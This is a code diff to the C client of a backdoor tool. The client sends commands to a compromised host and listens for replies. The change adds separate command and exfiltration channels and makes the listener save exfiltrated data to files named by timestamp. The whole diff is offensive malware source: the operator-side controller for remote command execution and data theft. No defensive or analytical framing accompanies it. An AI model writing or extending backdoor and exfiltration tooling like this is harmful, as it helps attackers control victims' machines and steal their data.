@@ -14,30 +14,25 @@
 #include "inet.h"
 
 int closing;
+int com_chan;
+int xfl_chan;
 
-void backdoor_client(uint32 ipaddr, int dport)
+void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan)
 {
-//	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
-//	pthread_t exfil_thread;
 
-//	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-//	bzero(&saddr, sizeof(saddr));
-	
+	com_chan = cchan;
+	xfl_chan = xchan;
+
 	if (ipaddr == 0)
 		error("Invalid IP specified.");
 
 	if (!val_port(dport))
 		error("Invalid destination port specified.");
 
-//	saddr.sin_family = AF_INET;
-//	saddr.sin_addr.s_addr = ipaddr;
-//	saddr.sin_port = htons(dport);
-
 	closing = 0;
 	pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
-//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
 	
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -146,7 +141,24 @@ void *listen_thread(void *arg)
 
 		// Step 8: show the results
 		if (type == RSP_TYP)
+		{
 			printf("Data: %s", data);
+		}
+		else if (type == XFL_TYP)
+		{
+			char fname[MAX_LEN];
+			FILE* file;
+			uint64 timestamp;
+
+			timestamp = get_sec();
+			sprintf(fname, "%llX", timestamp);
+			file = open_file(fname, TRUE);
+
+			printf("%s", data);
+			fwrite(data, buf_len, 1, file);
+
+			fclose(file);
+		}
 
 		// Step 9: reset buffer
 		memset(buf, 0, MAX_LEN);
